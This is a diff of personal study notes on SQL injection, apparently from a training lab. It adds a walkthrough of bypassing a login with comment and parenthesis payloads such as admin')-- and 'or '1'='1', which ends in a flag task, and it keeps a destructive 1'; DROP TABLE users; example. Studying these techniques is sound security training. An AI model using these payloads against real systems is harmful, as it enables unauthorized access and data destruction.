@@ -285,7 +285,8 @@ mysql> SELECT username,password FROM logins;
 | administrator | adm1n_p@ss |
 | john          | john123!   |
 | tom           | tom123!    |
-+---------------+------------+
+
+The 'DROP' statement will permanently and completely delete the table with no confirmation, so it should be used with caution.
 
 mysql> DROP TABLE logins;
 
@@ -294,8 +295,6 @@ Query OK, 0 rows affected (0.01 sec)
 mysql> SHOW TABLES;
 
 Empty set (0.00 sec)
-
-The 'DROP' statement will permanently and completely delete the table with no confirmation, so it should be used with caution.
 
 We can use ALTER to change the name of any table and any of its fields or to delete or add a new column to an existing table. 
 The below example adds a new column newColumn to the logins table using ADD:
@@ -530,7 +529,8 @@ select * from logins where username like '%$searchInput'
 So, if we input admin, it becomes '%admin'. In this case, if we write any SQL code, it would just be considered as a search term. 
 For example, if we input SHOW DATABASES;, it would be executed as '%SHOW DATABASES;' The web application will search for usernames 
 similar to SHOW DATABASES;. However, as there is no sanitization, in this case, we can add a single quote ('), 
-which will end the user-input field, and after it, we can write actual SQL code. For example, if we search for 1'; DROP TABLE users;, the search input would be:
+which will end the user-input field, and after it, we can write actual SQL code. For example, if we search for 1'; DROP TABLE users;, 
+the search input would be:
 
 Code: php
 '%1'; DROP TABLE users;'
@@ -672,7 +672,8 @@ Let us try this as the username and see the response.
 
 SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
 
-We were able to log in successfully as admin. However, what if we did not know a valid username? 
+*We were able to log in successfully as admin. However, what if we did not know a valid username? 
+
 Let us try the same request with a different username this time.
 
 SELECT * FROM logins WHERE username='NotAdmin' or '1'='1' AND password = 'something';
@@ -699,12 +700,12 @@ password = nothing only in login
 
 tom')-- -
 
-*Using Comments
+# Using Comments
 
 How to use comments to subvert the logic of more advanced SQL queries and end up with a working SQL query to bypass the login 
 authentication process.
 
-Comments
+-Comments
 Just like any other language, SQL allows the use of comments as well. Comments are used to document queries or ignore a certain part 
 of the query. We can use two types of line comments with MySQL -- and #, in addition to an in-line comment /**/ 
 (though this is not usually used in SQL injections). The -- can be used as follows:
@@ -738,6 +739,62 @@ In order to use (#) as a comment within a browser, we can use '%23', which is an
 
 *The server will ignore the part of the query with AND password = 'something' during evaluation.
 
+# Auth Bypass with comments
+Let us go back to our previous example and inject admin'-- as our username. The final query will be:
+
+Code: sql
+SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
+
+As we can see from the syntax highlighting, the username is now admin, and the remainder of the query is now ignored as a comment. 
+Also, this way, we can ensure that the query does not have any syntax issues.
+
+Let us try using these on the login page, and log in with the username admin'-- and anything as the password:
+
+SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
+
+*As we see, we were able to bypass the authentication, as the new modified query checks for the username, with no other conditions.
+
+Another Example
+SQL supports the usage of parenthesis if the application needs to check for particular conditions before others. 
+Expressions within the parenthesis take precedence over other operators and are evaluated first
+
+SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password = '437bxxxxxxxxx';
+FAILED
+
+The above query ensures that the user's id is always greater than 1, which will prevent anyone from logging in as admin. 
+Additionally, we also see that the password was hashed before being used in the query. This will prevent us from injecting 
+through the password field because the input is changed to a hash.
+
+Let us try logging in with valid credentials admin / p@ssw0rd to see the response.
+
+SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password = '0f35xxxxxxxxx';
+FAILED
+
+*As expected, the login failed even though we supplied valid credentials because the admin’s ID equals 1. 
+So let us try logging in with the credentials of another user, such as tom.
+
+SELECT * FROM logins WHERE (username='tom' AND id > 1) AND password = '0f35xxxxxxxxx';
+
+Logging in as the user with an id not equal to 1 was successful. So, how can we log in as the admin? We know from the previous section 
+on comments that we can use them to comment out the rest of the query. So, let us try using admin'-- as the username.
+
+SELECT * FROM logins WHERE (username='admin'--' AND id > 1) AND password = '0f35xxxxxxxxx';
+FAILED
+
+*The login failed due to a syntax error, as a closed one did not balance the open parenthesis. To execute the query successfully,
+we will have to add a closing parenthesis. Let us try using the username admin')-- to close and comment out the rest.
+
+SELECT * FROM logins WHERE (username='admin')-- ' AND id > 1) AND password = '437bxxxxxxxxx';
+GOOD
+
+The query was successful, and we logged in as admin. The final query as a result of our input is:
+
+SELECT * FROM logins where (username='admin')
+The query above is like the one from the previous example and returns the row containing admin.
+
+*Login as the user with the id 5 to get the flagl
+
+SELECT * FROM logins WHERE (username='NotAdmin' or '1'='1' AND id > 4) AND password = 'something' or '1'='1';
 
 -----------------------------------------------------------------------------------------------------------
 -Search in CWE list quick access on the 2023 CWE Top 25 most dangerous weakness ID of the last entry:
@@ -2261,6 +2318,7 @@ http://snarkles.net/scripts/sneak/sneak.php
 http://utf-8.jp/public/jjencode.html
 
 http://ddecode.com/phpdecoder/
+
 
 
 
